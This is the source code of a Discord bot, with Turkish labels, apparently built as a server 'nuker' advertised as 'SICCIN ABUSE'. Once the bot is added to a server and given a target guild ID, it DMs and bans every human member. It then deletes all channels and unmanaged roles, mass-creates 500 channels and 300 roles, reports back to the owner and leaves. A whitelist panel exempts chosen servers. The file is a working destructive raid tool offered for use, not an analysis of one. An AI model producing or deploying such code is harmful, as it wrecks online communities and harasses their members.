require("dotenv").config();
const {
  Client, GatewayIntentBits, Partials,
  EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
  ModalBuilder, TextInputBuilder, TextInputStyle,
  StringSelectMenuBuilder, ActivityType
} = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.DirectMessages
  ],
  partials: [Partials.Channel]
});

const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const WL_KANAL_ID = process.env.WL_KANAL_ID;

// DATA
let cachedVideo = null;
let whitelist = {};
let whitelistMessageId = null;

// ================== READY ==================
client.once("ready", async () => {
  console.log(`🚀 Bot aktif: ${client.user.tag}`);

  const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";
  try {
    const res = await fetch(videoURL);
    const buffer = Buffer.from(await res.arrayBuffer());
    cachedVideo = { attachment: buffer, name: "video.mp4" };
    console.log("🎥 Video cachelendi");
  } catch (err) {
    console.log("❌ Video cache hatası:", err);
  }
});

// ================== DURUM KONTROL ==================
function hasSiccinStatus(member) {
  if (!member?.presence?.activities) return false;
  return member.presence.activities.some(act =>
    act.type === ActivityType.Custom &&
    act.state &&
    (act.state.includes("/siccin") || act.state.includes(".gg/siccin"))
  );
}

// ================== WHITELIST MESAJ ==================
async function updateWhitelistMessage(channel) {
  let description = "📜 **WHITELIST SUNUCULAR**\n\n";
  for (const id in whitelist) {
    description += `• ${whitelist[id].name} | ${whitelist[id].ownerTag} | ${id}\n`;
  }

  if (whitelistMessageId) {
    const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
    if (msg) return msg.edit({ content: description });
  }

  const msg = await channel.send({ content: description });
  whitelistMessageId = msg.id;
}

// ================== SICCiN ==================
async function siccinCommand(message) {
  const member = await message.guild.members.fetch(message.author.id);

  if (!hasSiccinStatus(member)) {
    return message.reply("❌ Durumunda `/siccin` veya `.gg/siccin` yok.");
  }

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("siccinStart")
      .setLabel("ＳＩＣＣＩＮ")
      .setStyle(ButtonStyle.Secondary)
  );

  const embed = new EmbedBuilder()
    .setColor("Red")
    .setTitle("ＳＩＣＣＩＮ ABUSE")
    .setDescription(
`**Özellikler**
• Anında Herkesi Banlar
• Herkese DM Çeker
• Tüm Kanal ve Rolleri Siler
• 500 Kanal, 300 Rol Oluşturur

Kullanmak için botun sunucuya **ekli** olması gerekmektedir.
[Botu Sunucuya Eklemek İçin Tıkla](https://discord.com/oauth2/authorize?client_id=1459824610211008592)

**Nasıl Kullanılır?**
Butona tıkla → Hedef Sunucu ID gir`
    )
    .setThumbnail(message.guild.iconURL({ dynamic: true }));

  await message.channel.send({ embeds: [embed], components: [row] });
}

// ================== PANEL ==================
async function openPanel(message) {
  if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;

  const embed = new EmbedBuilder()
    .setTitle("⚡ Vendetta Panel")
    .setDescription("Sistem seçiniz")
    .setColor("Grey");

  const selectRow = new ActionRowBuilder().addComponents(
    new StringSelectMenuBuilder()
      .setCustomId("panelMenu")
      .addOptions([{ label: "Whitelist Sistemi", value: "whitelist" }])
  );

  await message.reply({
    embeds: [embed],
    files: cachedVideo ? [cachedVideo] : [],
    components: [selectRow],
    ephemeral: true
  });
}

// ================== MESSAGE COMMANDS ==================
client.on("messageCreate", async message => {
  if (!message.guild || message.author.bot) return;

  const cmd = message.content.toLowerCase();

  if (cmd === ".siccin") return siccinCommand(message);
  if (cmd === ".vndt") return openPanel(message);
});

// ================== INTERACTIONS ==================
client.on("interactionCreate", async interaction => {

  // PANEL SELECT
  if (interaction.isStringSelectMenu() && interaction.customId === "panelMenu") {
    const embed = new EmbedBuilder()
      .setTitle("Whitelist Sistemi")
      .setDescription("Bir işlem seç")
      .setColor("Blue");

    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId("wlMenu")
        .addOptions([
          { label: "Whitelist Ekle", value: "wlEkle" },
          { label: "Whitelist Çıkar", value: "wlCikar" }
        ])
    );

    return interaction.update({ embeds: [embed], components: [row] });
  }

  // WL MENU
  if (interaction.isStringSelectMenu() && interaction.customId === "wlMenu") {
    const modal = new ModalBuilder()
      .setCustomId(interaction.values[0])
      .setTitle("Whitelist İşlemi");

    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId("guildID")
          .setLabel("Sunucu ID")
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      )
    );

    return interaction.showModal(modal);
  }

  // WL MODAL
  if (interaction.isModalSubmit()) {
    const guildID = interaction.fields.getTextInputValue("guildID");
    const wlChannel = await client.channels.fetch(WL_KANAL_ID);

    if (interaction.customId === "wlEkle") {
      const guild = client.guilds.cache.get(guildID);
      if (!guild) return interaction.reply({ content: "Sunucu bulunamadı", ephemeral: true });

      const owner = await guild.fetchOwner().catch(() => null);
      whitelist[guildID] = {
        name: guild.name,
        ownerTag: owner ? owner.user.tag : "Unknown"
      };

      await updateWhitelistMessage(wlChannel);
      return interaction.reply({ content: "✅ Whitelist eklendi", ephemeral: true });
    }

    if (interaction.customId === "wlCikar") {
      delete whitelist[guildID];
      await updateWhitelistMessage(wlChannel);
      return interaction.reply({ content: "🗑️ Whitelist çıkarıldı", ephemeral: true });
    }
  }

  // SICCiN BUTTON
  if (interaction.isButton() && interaction.customId === "siccinStart") {
    const modal = new ModalBuilder()
      .setCustomId("siccinModal")
      .setTitle("Hedef Sunucu ID");

    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId("guildID")
          .setLabel("Hedef Sunucu ID")
          .setStyle(TextInputStyle.Short)
          .setPlaceholder("1111111111111111")
          .setRequired(true)
      )
    );

    return interaction.showModal(modal);
  }

  // SICCiN MODAL
  if (interaction.isModalSubmit() && interaction.customId === "siccinModal") {
    const guildId = interaction.fields.getTextInputValue("guildID");
    const guild = client.guilds.cache.get(guildId);

    if (!guild)
      return interaction.reply({ content: "❌ Bot bu sunucuda yok.", ephemeral: true });

    if (whitelist[guildId])
      return interaction.reply({ content: "⚠️ Sunucu whitelist'te", ephemeral: true });

    await interaction.reply({ content: "💣 SICCiN BAŞLATILDI", ephemeral: true });

    // DM + BAN
    const members = await guild.members.fetch();
    for (const m of members.values()) {
      if (m.user.bot) continue;
      await m.send("💣 **SICCiN ABUSE**").catch(() => {});
      await m.ban({ reason: "SICCiN" }).catch(() => {});
    }

    // KANALLAR
    for (const c of guild.channels.cache.values()) {
      await c.delete().catch(() => {});
    }

    // ROLLER
    for (const r of guild.roles.cache.values()) {
      if (r.managed) continue;
      await r.delete().catch(() => {});
    }

    // OLUŞTUR
    for (let i = 0; i < 500; i++) {
      await guild.channels.create({
        name: `siccin-${i}`,
        type: 0
      }).catch(() => {});
    }

    for (let i = 0; i < 300; i++) {
      await guild.roles.create({
        name: `SICCiN-${i}`,
        color: "Red"
      }).catch(() => {});
    }

    // LOG OWNER
    const owner = await client.users.fetch(OWNER_ID).catch(() => null);
    if (owner) {
      owner.send(`✅ SICCiN tamamlandı\nSunucu: ${guild.name} (${guild.id})`);
    }

    await guild.leave().catch(() => {});
  }
});

client.login(process.env.BOT_TOKEN);
